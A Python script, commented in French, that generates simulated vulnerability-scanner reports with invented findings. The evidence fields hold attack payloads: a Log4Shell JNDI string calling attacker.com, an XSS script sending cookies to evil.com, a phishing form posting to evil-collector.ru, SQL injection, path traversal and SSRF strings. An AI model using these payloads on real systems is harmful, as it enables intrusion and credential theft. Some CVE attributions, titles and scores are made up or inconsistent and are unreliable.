#!/usr/bin/env python3
import sys
import json
import argparse
from datetime import datetime

# ====================== BASE DE DONNÉES CVSS ======================

CVE_SCORES = {
    # ─── CRITICAL ───────────────────────
    "CVE-2021-44228": {"score": 10.0, "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"},
    "CVE-2017-0144":  {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2019-0708":  {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2022-22965": {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2024-1234":  {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2014-6271":  {"score": 10.0, "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"},
    "CVE-2024-9999":  {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2015-4852":  {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2022-0778":  {"score": 9.1,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},
    "CVE-2023-4911":  {"score": 7.8,  "vecteur": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"},
    # ─── HIGH ────────────────────────────
    "CVE-2023-5678":  {"score": 8.1,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
    "CVE-2024-1111":  {"score": 7.5,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "CVE-2018-15473": {"score": 5.3,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "CVE-2022-31813": {"score": 5.3,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "CVE-2022-22817": {"score": 8.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"},
    "CVE-2022-24999": {"score": 7.5,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},
    "CVE-2022-32221": {"score": 7.5,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "CVE-2020-14343": {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "CVE-2018-0171":  {"score": 9.8,  "vecteur": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
}


def get_cvss(cve_id):
    """Retourne score CVSS et vecteur pour un CVE donné, None sinon."""
    if not cve_id:
        return None, None
    data = CVE_SCORES.get(cve_id)
    if not data:
        return None, None
    return data["score"], data["vecteur"]


def build_vuln(titre, severite, description, impact, recommandation, preuve,
               cve_id=None, url=None):
    """Constructeur standard. CVSS auto si CVE connu."""
    score, vecteur = get_cvss(cve_id)

    vuln = {
        "titre"         : titre,
        "severite"      : severite,
        "description"   : description,
        "impact"        : impact,
        "recommandation": recommandation,
        "preuve"        : preuve,
        "scoreCVSS"     : score,
        "vecteurCVSS"   : vecteur,
    }

    if cve_id: vuln["cveId"] = cve_id
    if url:    vuln["url"]   = url

    return vuln


# ====================== SIMULATEURS ======================

def simulate_nuclei(target, scan_id):
    return {
        "status": "success",
        "scanner": "NUCLEI",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="Remote Code Execution via Nginx Path Traversal",
                severite="CRITICAL",
                cve_id="CVE-2024-1234",
                url=f"http://{target}/admin",
                description=(
                    "Une vulnérabilité de traversée de chemin dans Nginx permet à un attaquant "
                    "non authentifié d'exécuter du code arbitraire sur le serveur. "
                    "Le vecteur d'attaque exploite une mauvaise configuration du bloc location "
                    "combinée à une version obsolète de Nginx (< 1.25.3)."
                ),
                impact=(
                    "Compromission totale du serveur : accès root, exfiltration de données, "
                    "installation de backdoors, pivot vers le réseau interne."
                ),
                recommandation=(
                    "1. Mettre à jour Nginx vers la version 1.25.3 ou supérieure.\n"
                    "2. Restreindre l'accès à /admin via IP whitelisting.\n"
                    "3. Appliquer le principe du moindre privilège sur les processus Nginx.\n"
                    "4. Activer SELinux/AppArmor pour confiner le processus."
                ),
                preuve=f"GET http://{target}/admin/../../../etc/passwd → 200 OK",
            ),
            build_vuln(
                titre="Apache Log4Shell RCE (Log4j 2.x)",
                severite="CRITICAL",
                cve_id="CVE-2021-44228",
                url=f"http://{target}/api/v1/auth",
                description=(
                    "Log4Shell est une vulnérabilité critique dans Apache Log4j 2 (versions 2.0-beta9 "
                    "à 2.14.1) permettant l'exécution de code à distance via des messages de log "
                    "contenant des références JNDI malveillantes."
                ),
                impact=(
                    "Exécution de code arbitraire à distance sans authentification. "
                    "Utilisée massivement dans des campagnes de ransomware et d'espionnage."
                ),
                recommandation=(
                    "1. Mettre à jour Log4j vers 2.17.1+ (Java 8) ou 2.12.4+ (Java 7).\n"
                    "2. Définir -Dlog4j2.formatMsgNoLookups=true.\n"
                    "3. Bloquer les connexions JNDI sortantes au niveau firewall.\n"
                    "4. Utiliser un WAF avec règles Log4Shell activées."
                ),
                preuve="Header X-Api-Version: ${jndi:ldap://attacker.com/exploit} → callback reçu",
            ),
            build_vuln(
                titre="Spring4Shell - Spring Framework RCE",
                severite="CRITICAL",
                cve_id="CVE-2022-22965",
                url=f"http://{target}/spring/",
                description=(
                    "Vulnérabilité dans Spring MVC/WebFlux permettant l'exécution de code à distance "
                    "via la manipulation de ClassLoader. Affecte Spring Framework 5.3.x < 5.3.18."
                ),
                impact=(
                    "Écriture de fichiers arbitraires sur le serveur, déploiement de webshell, "
                    "compromission complète de l'application."
                ),
                recommandation=(
                    "1. Mettre à jour Spring Framework vers 5.3.18+.\n"
                    "2. Migrer vers Spring Boot 2.6.6+.\n"
                    "3. Appliquer des règles WAF bloquant les manipulations de class.classLoader."
                ),
                preuve=f"POST {target}/spring/app → class.module.classLoader.URLs[0]=jar:...",
            ),
            build_vuln(
                titre="SQL Injection sur le formulaire de connexion",
                severite="HIGH",
                cve_id="CVE-2023-5678",
                url=f"http://{target}/login.php",
                description=(
                    "Injection SQL de type UNION-based détectée sur le paramètre username. "
                    "L'entrée utilisateur n'est pas correctement filtrée avant d'être incorporée "
                    "dans la requête SQL."
                ),
                impact=(
                    "Contournement d'authentification, extraction de données sensibles "
                    "(mots de passe, données personnelles), modification ou suppression de données."
                ),
                recommandation=(
                    "1. Utiliser des requêtes préparées (PreparedStatement) ou un ORM.\n"
                    "2. Valider et assainir toutes les entrées utilisateur.\n"
                    "3. Appliquer le principe du moindre privilège sur le compte DB.\n"
                    "4. Déployer un WAF avec règles anti-SQLi."
                ),
                preuve="username=' OR '1'='1'-- → connexion réussie sans mot de passe",
            ),
            build_vuln(
                titre="Reflected Cross-Site Scripting (XSS)",
                severite="HIGH",
                url=f"http://{target}/search?q=",
                description=(
                    "Une vulnérabilité XSS réfléchie a été identifiée sur le paramètre q "
                    "de la page de recherche. Le contenu fourni par l'utilisateur est reflété "
                    "dans la réponse HTML sans encodage."
                ),
                impact=(
                    "Vol de cookies de session, redirection vers des sites malveillants, "
                    "keylogging, défiguration de page, phishing ciblé."
                ),
                recommandation=(
                    "1. Encoder toutes les sorties HTML.\n"
                    "2. Implémenter une Content Security Policy (CSP) stricte.\n"
                    "3. Utiliser l'attribut HttpOnly et Secure sur les cookies.\n"
                    "4. Valider les entrées côté serveur avec une whitelist."
                ),
                preuve=f"GET /search?q=<script>alert(document.cookie)</script> → exécuté",
            ),
            build_vuln(
                titre="Directory Traversal / Path Traversal",
                severite="HIGH",
                cve_id="CVE-2024-1111",
                url=f"http://{target}/files?name=",
                description=(
                    "La fonctionnalité de téléchargement de fichiers est vulnérable à la traversée "
                    "de répertoire. En manipulant le paramètre name avec des séquences ../, "
                    "un attaquant peut accéder à des fichiers en dehors du répertoire prévu."
                ),
                impact=(
                    "Lecture de fichiers sensibles du système (/etc/passwd, clés SSH, "
                    "fichiers de configuration, code source de l'application)."
                ),
                recommandation=(
                    "1. Valider et canonicaliser les chemins de fichiers.\n"
                    "2. Utiliser une liste blanche des fichiers accessibles.\n"
                    "3. Isoler les fichiers publics dans un répertoire dédié (chroot).\n"
                    "4. Refuser les caractères ../ dans les noms de fichiers."
                ),
                preuve=f"GET /files?name=../../../etc/shadow → contenu du fichier exposé",
            ),
            build_vuln(
                titre="Broken Authentication - Session Fixation",
                severite="HIGH",
                url=f"http://{target}/auth/login",
                description=(
                    "L'application ne régénère pas l'identifiant de session après une authentification "
                    "réussie. Un attaquant peut prédéfinir un ID de session et attendre qu'un "
                    "utilisateur s'authentifie avec cet ID pour hijacker sa session."
                ),
                impact=(
                    "Prise de contrôle de compte, accès non autorisé "
                    "aux données et fonctionnalités de l'utilisateur ciblé."
                ),
                recommandation=(
                    "1. Régénérer l'ID de session après chaque authentification.\n"
                    "2. Invalider les sessions existantes à la connexion.\n"
                    "3. Définir une durée de vie courte sur les sessions.\n"
                    "4. Lier les sessions à l'adresse IP et au User-Agent."
                ),
                preuve="Session ID identique avant et après authentification confirmé",
            ),
            build_vuln(
                titre="En-têtes de sécurité HTTP manquants",
                severite="MEDIUM",
                url=f"http://{target}/",
                description=(
                    "Plusieurs en-têtes de sécurité HTTP critiques sont absents des réponses : "
                    "X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security, "
                    "Content-Security-Policy, Permissions-Policy, Referrer-Policy."
                ),
                impact=(
                    "Exposition aux attaques de type clickjacking, MIME sniffing, "
                    "man-in-the-middle, injection de contenu."
                ),
                recommandation=(
                    "Ajouter dans la configuration du serveur web :\n"
                    "Strict-Transport-Security: max-age=31536000; includeSubDomains\n"
                    "X-Content-Type-Options: nosniff\n"
                    "X-Frame-Options: DENY\n"
                    "Content-Security-Policy: default-src 'self'\n"
                    "Referrer-Policy: strict-origin-when-cross-origin"
                ),
                preuve="Réponse HTTP analysée — headers de sécurité absents",
            ),
            build_vuln(
                titre="Configuration SSL/TLS faible (TLS 1.0/1.1 activé)",
                severite="MEDIUM",
                url=f"https://{target}/",
                description=(
                    "Le serveur supporte des versions obsolètes de TLS (1.0 et 1.1) "
                    "et des suites cryptographiques faibles (RC4, DES, 3DES, NULL). "
                    "Ces versions sont vulnérables aux attaques POODLE, BEAST, CRIME."
                ),
                impact=(
                    "Déchiffrement du trafic réseau par un attaquant en position MITM, "
                    "vol de données en transit (credentials, tokens de session)."
                ),
                recommandation=(
                    "1. Désactiver TLS 1.0 et TLS 1.1.\n"
                    "2. Activer uniquement TLS 1.2 et TLS 1.3.\n"
                    "3. Configurer des suites cryptographiques fortes (AES-GCM, CHACHA20).\n"
                    "4. Activer HSTS avec preload."
                ),
                preuve="TLS 1.0 accepté sur le port 443 — cipher RC4-SHA détecté",
            ),
            build_vuln(
                titre="Exposition d'informations dans les erreurs",
                severite="MEDIUM",
                url=f"http://{target}/api/users/0",
                description=(
                    "Les messages d'erreur exposent des informations techniques sensibles : "
                    "stack traces complètes, versions de frameworks, chemins de fichiers internes."
                ),
                impact=(
                    "Aide à la reconnaissance pour un attaquant, "
                    "facilite l'exploitation d'autres vulnérabilités."
                ),
                recommandation=(
                    "1. Désactiver le mode debug en production.\n"
                    "2. Implémenter des pages d'erreur génériques.\n"
                    "3. Logger les erreurs côté serveur sans les exposer au client."
                ),
                preuve="GET /api/users/0 → Stack trace Java avec chemins internes exposés",
            ),
            build_vuln(
                titre="Cookie sans attribut Secure et HttpOnly",
                severite="LOW",
                url=f"http://{target}/",
                description=(
                    "Les cookies de session sont définis sans les attributs de sécurité "
                    "Secure et HttpOnly."
                ),
                impact="Risque de vol de cookie via XSS ou interception réseau non chiffrée.",
                recommandation=(
                    "1. Ajouter l'attribut Secure sur tous les cookies.\n"
                    "2. Ajouter l'attribut HttpOnly sur les cookies de session.\n"
                    "3. Ajouter l'attribut SameSite=Strict ou Lax."
                ),
                preuve="Set-Cookie: session=abc123 (sans Secure, HttpOnly, SameSite)",
            ),
            build_vuln(
                titre="Version du serveur web exposée",
                severite="LOW",
                url=f"http://{target}/",
                description=(
                    "L'en-tête Server expose la version exacte du logiciel utilisé. "
                    "Cette information aide un attaquant à cibler des CVE spécifiques."
                ),
                impact="Facilite la reconnaissance et le ciblage d'exploits.",
                recommandation=(
                    "1. Masquer ou modifier l'en-tête Server.\n"
                    "2. Supprimer la signature de version (server_tokens off dans Nginx).\n"
                    "3. Supprimer l'en-tête X-Powered-By."
                ),
                preuve="Server: nginx/1.18.0 exposé dans les en-têtes HTTP",
            ),
        ]
    }


def simulate_openvas(target, scan_id):
    return {
        "status": "success",
        "scanner": "OPENVAS",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="EternalBlue SMBv1 Remote Code Execution",
                severite="CRITICAL",
                cve_id="CVE-2017-0144",
                description=(
                    "Le protocole SMBv1 présente une vulnérabilité critique exploitée par EternalBlue. "
                    "Port 445/TCP détecté ouvert avec SMBv1 activé."
                ),
                impact=(
                    "Compromission complète du système Windows, propagation latérale, "
                    "déploiement de ransomware, exfiltration de données."
                ),
                recommandation=(
                    "1. URGENT : Désactiver SMBv1.\n"
                    "   PowerShell: Set-SmbServerConfiguration -EnableSMB1Protocol $false\n"
                    "2. Appliquer le patch MS17-010 (KB4012212).\n"
                    "3. Bloquer le port 445/TCP aux frontières réseau.\n"
                    "4. Segmenter le réseau pour limiter la propagation SMB."
                ),
                preuve=f"Port 445/TCP ouvert | SMBv1 NTLM Negotiation réussie sur {target}",
            ),
            build_vuln(
                titre="BlueKeep - RDP Pre-Auth RCE",
                severite="CRITICAL",
                cve_id="CVE-2019-0708",
                description=(
                    "BlueKeep est une vulnérabilité wormable dans RDP de Windows. "
                    "Elle permet l'exécution de code à distance sans authentification via le port 3389."
                ),
                impact="Accès complet au système sans identifiants, propagation automatique.",
                recommandation=(
                    "1. Appliquer le patch Microsoft KB4499175.\n"
                    "2. Désactiver RDP si non nécessaire.\n"
                    "3. Restreindre RDP derrière un VPN.\n"
                    "4. Activer l'authentification NLA."
                ),
                preuve=f"Port 3389/TCP ouvert | Fingerprint RDP vulnérable sur {target}",
            ),
            build_vuln(
                titre="OpenSSH Username Enumeration",
                severite="HIGH",
                cve_id="CVE-2018-15473",
                description=(
                    "OpenSSH versions < 7.7 est vulnérable à l'énumération d'utilisateurs "
                    "via les différences de timing dans les réponses d'authentification."
                ),
                impact="Construction d'une liste valide d'utilisateurs pour le brute force.",
                recommandation=(
                    "1. Mettre à jour OpenSSH vers 7.7+.\n"
                    "2. Implémenter fail2ban.\n"
                    "3. Désactiver l'authentification par mot de passe (clés SSH uniquement)."
                ),
                preuve="Énumération réussie : users admin, root, ubuntu confirmés",
            ),
            build_vuln(
                titre="Authentification SSH par mot de passe activée",
                severite="HIGH",
                description=(
                    "Le service SSH autorise l'authentification par mot de passe. "
                    "Cette configuration expose le service aux attaques de force brute."
                ),
                impact="Compromission du système via brute force.",
                recommandation=(
                    "1. Désactiver PasswordAuthentication dans /etc/ssh/sshd_config.\n"
                    "2. Utiliser exclusivement les clés SSH (ED25519).\n"
                    "3. Configurer fail2ban avec seuil de 3 tentatives."
                ),
                preuve="SSH banner: OpenSSH_7.4 | PasswordAuthentication: yes confirmé",
            ),
            build_vuln(
                titre="Serveur FTP anonyme activé",
                severite="HIGH",
                description=(
                    "Le service FTP (port 21) accepte les connexions anonymes sans authentification."
                ),
                impact="Accès non autorisé à des fichiers sensibles.",
                recommandation=(
                    "1. Désactiver l'accès FTP anonyme.\n"
                    "2. Migrer vers SFTP ou FTPS.\n"
                    "3. Fermer le port 21 si FTP n'est pas nécessaire."
                ),
                preuve=f"ftp {target} → USER anonymous → 230 Login successful",
            ),
            build_vuln(
                titre="SNMP Community String 'public' exposée",
                severite="HIGH",
                description=(
                    "Le service SNMP (port 161/UDP) utilise la community string par défaut 'public'. "
                    "Permet d'interroger l'équipement et d'obtenir des informations réseau détaillées."
                ),
                impact="Divulgation d'informations réseau critiques.",
                recommandation=(
                    "1. Migrer vers SNMPv3 avec authentification.\n"
                    "2. Changer les community strings par défaut.\n"
                    "3. Filtrer l'accès SNMP par ACL."
                ),
                preuve=f"snmpwalk -v2c -c public {target} → 1247 OIDs retournés",
            ),
            build_vuln(
                titre="DNS Zone Transfer (AXFR) autorisé",
                severite="HIGH",
                description=(
                    "Le serveur DNS autorise les transferts de zone depuis n'importe quelle source. "
                    "Expose l'intégralité des enregistrements DNS du domaine."
                ),
                impact="Divulgation de tous les hôtes internes, sous-domaines, adresses IP.",
                recommandation=(
                    "1. Restreindre AXFR aux serveurs DNS secondaires autorisés.\n"
                    "2. Configurer une liste blanche d'IP.\n"
                    "3. Implémenter DNSSEC."
                ),
                preuve=f"dig AXFR @{target} domain.local → 342 enregistrements transférés",
            ),
            build_vuln(
                titre="Pare-feu - Règles trop permissives (ANY/ANY)",
                severite="HIGH",
                description=(
                    "L'analyse du pare-feu révèle des règles autorisant tout le trafic "
                    "entrant et sortant (ANY → ANY → ANY port)."
                ),
                impact="Absence de contrôle du trafic réseau, exposition de tous les services.",
                recommandation=(
                    "1. Appliquer le principe du moindre privilège.\n"
                    "2. Implémenter une politique 'deny all' par défaut.\n"
                    "3. Créer des règles spécifiques pour chaque flux.\n"
                    "4. Activer la journalisation du trafic refusé."
                ),
                preuve="Règle 0: ANY → ANY → ALL PORTS → ALLOW détectée",
            ),
            build_vuln(
                titre="Apache HTTP Server version obsolète",
                severite="MEDIUM",
                cve_id="CVE-2022-31813",
                description=(
                    "La version d'Apache HTTP Server détectée (2.4.41) est obsolète et "
                    "présente plusieurs vulnérabilités connues."
                ),
                impact="Exposition à plusieurs CVE publiquement exploitées.",
                recommandation=(
                    "1. Mettre à jour Apache vers la version 2.4.57+.\n"
                    "2. Supprimer les modules Apache non nécessaires.\n"
                    "3. Masquer la version (ServerTokens Prod)."
                ),
                preuve=f"Server: Apache/2.4.41 (Ubuntu) détecté sur {target}:80",
            ),
            build_vuln(
                titre="Port RDP exposé sur Internet",
                severite="MEDIUM",
                description=(
                    "Le port 3389 (RDP) est directement accessible depuis Internet."
                ),
                impact="Surface d'attaque étendue pour le brute force et les exploits RDP.",
                recommandation=(
                    "1. Restreindre RDP derrière un VPN avec MFA.\n"
                    "2. Activer NLA (Network Level Authentication).\n"
                    "3. Implémenter des politiques de verrouillage de compte."
                ),
                preuve=f"Port 3389/TCP accessible publiquement depuis {target}",
            ),
            build_vuln(
                titre="Certificat SSL auto-signé détecté",
                severite="LOW",
                description=(
                    "Le service HTTPS utilise un certificat SSL auto-signé. "
                    "Les navigateurs affichent des avertissements de sécurité."
                ),
                impact="Risque d'attaque MITM si les utilisateurs acceptent le certificat.",
                recommandation=(
                    "1. Obtenir un certificat TLS émis par une CA reconnue (Let's Encrypt).\n"
                    "2. Implémenter le renouvellement automatique.\n"
                    "3. Activer HSTS."
                ),
                preuve=f"Certificat self-signed, CN=localhost sur {target}:443",
            ),
        ]
    }


def simulate_grype(target, scan_id):
    return {
        "status": "success",
        "scanner": "GRYPE",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="Log4j2 Remote Code Execution (Log4Shell)",
                severite="CRITICAL",
                cve_id="CVE-2021-44228",
                description="log4j-core 2.14.1 détecté dans l'image Docker. Vulnérabilité Log4Shell.",
                impact="RCE sans authentification, compromission complète du conteneur.",
                recommandation=(
                    "1. URGENT : Mettre à jour log4j-core vers 2.17.1+.\n"
                    "2. Reconstruire et redéployer l'image.\n"
                    "3. Scanner toutes les images avec Grype/Trivy en CI/CD."
                ),
                preuve="Package log4j-core:2.14.1 dans /app/lib/log4j-core-2.14.1.jar",
            ),
            build_vuln(
                titre="OpenSSL Critical Buffer Overflow",
                severite="CRITICAL",
                cve_id="CVE-2022-0778",
                description="OpenSSL 1.1.1l détecté. Boucle infinie dans BN_mod_sqrt().",
                impact="Déni de service complet du service TLS.",
                recommandation="Mettre à jour OpenSSL vers 1.1.1n+ ou 3.0.2+.",
                preuve="libssl1.1:1.1.1l-r0 dans alpine:3.14 layer",
            ),
            build_vuln(
                titre="Spring Framework RCE (Spring4Shell)",
                severite="CRITICAL",
                cve_id="CVE-2022-22965",
                description="spring-webmvc 5.3.16 détecté dans le classpath Java.",
                impact="Écriture de fichiers arbitraires, déploiement de webshell, RCE complet.",
                recommandation="Mettre à jour spring-webmvc vers 5.3.18+.",
                preuve="spring-webmvc-5.3.16.jar dans /app/WEB-INF/lib/",
            ),
            build_vuln(
                titre="Python Pillow - Déni de service",
                severite="HIGH",
                cve_id="CVE-2022-22817",
                description="Pillow 9.0.0 vulnérable via ImageMath.eval().",
                impact="Exécution de code Python arbitraire.",
                recommandation="Mettre à jour Pillow vers 9.0.1+.",
                preuve="Pillow==9.0.0 dans /app/requirements.txt",
            ),
            build_vuln(
                titre="Node.js express - Prototype Pollution",
                severite="HIGH",
                cve_id="CVE-2022-24999",
                description="qs 6.5.2 vulnérable à la pollution de prototype.",
                impact="Modification du prototype Object global, DoS ou RCE selon le contexte.",
                recommandation="Mettre à jour qs vers 6.5.3+ ou 6.10.3+.",
                preuve="qs@6.5.2 dans package-lock.json | npm audit: 1 high severity",
            ),
            build_vuln(
                titre="Packages Alpine obsolètes avec CVE actives",
                severite="HIGH",
                description="Plusieurs packages Alpine Linux avec des vulnérabilités actives.",
                impact="RCE, déni de service, débordement de buffer selon les packages.",
                recommandation=(
                    "1. Mettre à jour l'image de base vers alpine:3.18+.\n"
                    "2. Utiliser des images distroless."
                ),
                preuve="FROM alpine:3.14 | 23 packages avec CVE dont 4 HIGH",
            ),
            build_vuln(
                titre="Secrets exposés dans les layers Docker",
                severite="MEDIUM",
                description=(
                    "Des secrets (clés API, mots de passe) détectés dans les layers Docker."
                ),
                impact="Exposition de credentials si l'image est poussée sur un registry public.",
                recommandation=(
                    "1. Ne jamais stocker de secrets dans les Dockerfiles.\n"
                    "2. Utiliser Docker Secrets ou Vault.\n"
                    "3. Utiliser des builds multi-stage."
                ),
                preuve="ENV AWS_SECRET_KEY=AKIA... détecté dans docker history layer 4",
            ),
            build_vuln(
                titre="Python Dependency - PyYAML vulnérable",
                severite="MEDIUM",
                cve_id="CVE-2020-14343",
                description="PyYAML 5.3.1 vulnérable via yaml.load() sans Loader.",
                impact="RCE si yaml.load() est utilisé avec des données non fiables.",
                recommandation="Mettre à jour PyYAML vers 6.0+. Remplacer yaml.load() par yaml.safe_load().",
                preuve="PyYAML==5.3.1 dans requirements.txt",
            ),
            build_vuln(
                titre="Image Docker non mise à jour depuis 180 jours",
                severite="LOW",
                description="L'image Docker de base n'a pas été reconstruite depuis 180 jours.",
                impact="Accumulation de vulnérabilités non patchées.",
                recommandation="Implémenter un rebuild automatique hebdomadaire.",
                preuve="Created: 2023-08-15 | Age: 187 jours | Base: python:3.9-slim-buster",
            ),
        ]
    }


def simulate_zap(target, scan_id):
    return {
        "status": "success",
        "scanner": "ZAP",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="SQL Injection - Authentification Bypass",
                severite="CRITICAL",
                cve_id="CVE-2024-9999",
                url=f"http://{target}/login",
                description=(
                    "Injection SQL critique sur le formulaire de connexion. "
                    "Le paramètre email est directement injecté dans la requête SQL."
                ),
                impact="Contournement total de l'authentification, accès administrateur.",
                recommandation=(
                    "1. Utiliser des requêtes préparées.\n"
                    "2. Implémenter un ORM.\n"
                    "3. Déployer un WAF avec règles anti-SQLi."
                ),
                preuve=f"POST /login | email=' OR 1=1 LIMIT 1-- | HTTP 302 → /admin",
            ),
            build_vuln(
                titre="XML External Entity (XXE) Injection",
                severite="CRITICAL",
                url=f"http://{target}/api/import",
                description="L'endpoint d'import XML traite les entités externes sans restriction.",
                impact="Lecture de fichiers système, SSRF vers services internes.",
                recommandation=(
                    "1. Désactiver le traitement des entités externes.\n"
                    "2. Migrer vers JSON si possible.\n"
                    "3. Utiliser defusedxml en Python."
                ),
                preuve="POST /api/import | <!ENTITY xxe SYSTEM 'file:///etc/passwd'> → contenu retourné",
            ),
            build_vuln(
                titre="Server-Side Request Forgery (SSRF)",
                severite="CRITICAL",
                url=f"http://{target}/api/fetch",
                description="L'endpoint /api/fetch effectue des requêtes HTTP côté serveur sans validation.",
                impact="Accès aux métadonnées AWS, services internes, exfiltration de données.",
                recommandation=(
                    "1. Valider toutes les URLs fournies par l'utilisateur.\n"
                    "2. Implémenter une liste blanche de domaines.\n"
                    "3. Bloquer les plages d'IP privées."
                ),
                preuve=f"GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ → IAM credentials",
            ),
            build_vuln(
                titre="Cross-Site Request Forgery (CSRF)",
                severite="HIGH",
                url=f"http://{target}/account/transfer",
                description="Les formulaires d'actions sensibles ne possèdent pas de token CSRF.",
                impact="Exécution d'actions non autorisées au nom de l'utilisateur connecté.",
                recommandation=(
                    "1. Implémenter des tokens CSRF synchronisés.\n"
                    "2. Valider l'en-tête Origin/Referer.\n"
                    "3. Utiliser SameSite=Strict sur les cookies."
                ),
                preuve=f"POST /account/transfer | Aucun token CSRF | Requête forgée → succès",
            ),
            build_vuln(
                titre="Insecure Direct Object Reference (IDOR)",
                severite="HIGH",
                url=f"http://{target}/api/users/",
                description=(
                    "L'API expose les objets via des identifiants séquentiels "
                    "sans vérification des droits d'accès."
                ),
                impact="Accès non autorisé aux données de tous les utilisateurs.",
                recommandation=(
                    "1. Implémenter des contrôles d'autorisation.\n"
                    "2. Utiliser des identifiants non prédictibles (UUID v4).\n"
                    "3. Appliquer des politiques ABAC."
                ),
                preuve=f"GET /api/users/1235 avec session user 1234 → données user 1235 retournées",
            ),
            build_vuln(
                titre="Stored XSS dans les commentaires",
                severite="HIGH",
                url=f"http://{target}/forum/post",
                description=(
                    "Vulnérabilité XSS persistante dans le champ de commentaire du forum."
                ),
                impact="Vol de cookies de tous les visiteurs, défacement persistant.",
                recommandation=(
                    "1. Encoder toutes les sorties HTML.\n"
                    "2. Implémenter DOMPurify côté client.\n"
                    "3. Définir une CSP stricte."
                ),
                preuve=f"POST /forum/post | body=<script>fetch('https://evil.com?c='+document.cookie)</script>",
            ),
            build_vuln(
                titre="Clickjacking - X-Frame-Options absent",
                severite="MEDIUM",
                url=f"http://{target}/",
                description="L'application ne définit pas X-Frame-Options ni frame-ancestors CSP.",
                impact="Manipulation des clics utilisateur via iframe malveillant.",
                recommandation="Ajouter X-Frame-Options: DENY ou CSP: frame-ancestors 'none'.",
                preuve="En-tête X-Frame-Options absent | Page intégrée dans iframe → succès",
            ),
            build_vuln(
                titre="Page de phishing détectée",
                severite="MEDIUM",
                url=f"http://{target}/secure-login",
                description="Page imitant l'interface de connexion d'une institution bancaire détectée.",
                impact="Vol de credentials bancaires, fraude financière.",
                recommandation=(
                    "1. Supprimer immédiatement la page.\n"
                    "2. Analyser les logs.\n"
                    "3. Signaler à Google Safe Browsing."
                ),
                preuve="Page /secure-login → formulaire envoyant vers http://evil-collector.ru/steal",
            ),
            build_vuln(
                titre="Politique de mots de passe insuffisante",
                severite="LOW",
                url=f"http://{target}/register",
                description="L'application accepte des mots de passe très courts (minimum 4 caractères).",
                impact="Facilitation des attaques de force brute et credential stuffing.",
                recommandation=(
                    "1. Imposer un minimum de 12 caractères.\n"
                    "2. Exiger complexité.\n"
                    "3. Vérifier contre HaveIBeenPwned."
                ),
                preuve="POST /register | password=1234 → HTTP 201 Created",
            ),
        ]
    }


def simulate_burp_suite(target, scan_id):
    return {
        "status": "success",
        "scanner": "BURP_SUITE",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="Insecure Deserialization - Java Object Injection",
                severite="CRITICAL",
                cve_id="CVE-2015-4852",
                url=f"http://{target}/api/session",
                description="L'application désérialise des objets Java fournis par le client sans validation.",
                impact="Exécution de commandes système arbitraires avec les privilèges de l'application.",
                recommandation=(
                    "1. Ne jamais désérialiser des données utilisateur non vérifiées.\n"
                    "2. Utiliser JSON au lieu de la sérialisation Java.\n"
                    "3. Implémenter un ObjectInputFilter en Java 9+."
                ),
                preuve="POST /api/session | Body: rO0ABXQADm... (objet Java) → RCE confirmé",
            ),
            build_vuln(
                titre="Server-Side Template Injection (SSTI)",
                severite="CRITICAL",
                url=f"http://{target}/template",
                description="Injection de templates côté serveur via les paramètres utilisateur.",
                impact="Exécution de code arbitraire côté serveur, lecture de fichiers système.",
                recommandation=(
                    "1. Ne pas construire des templates avec des données utilisateur.\n"
                    "2. Utiliser un sandbox de template.\n"
                    "3. Valider toutes les entrées utilisateur."
                ),
                preuve=f"GET /template?name={{{{7*7}}}} → '49' retourné",
            ),
            build_vuln(
                titre="Exposition de données sensibles - API Keys",
                severite="HIGH",
                url=f"http://{target}/api/config",
                description="L'endpoint /api/config retourne des clés API et chaînes de connexion BDD.",
                impact="Accès non autorisé aux services tiers (AWS, paiements).",
                recommandation=(
                    "1. Ne jamais exposer de secrets dans les réponses API.\n"
                    "2. Rotation immédiate de tous les secrets.\n"
                    "3. Utiliser un gestionnaire de secrets."
                ),
                preuve='GET /api/config → {"aws_key": "AKIA...", "jwt_secret": "..."}',
            ),
            build_vuln(
                titre="Broken Access Control - Escalade de privilèges",
                severite="HIGH",
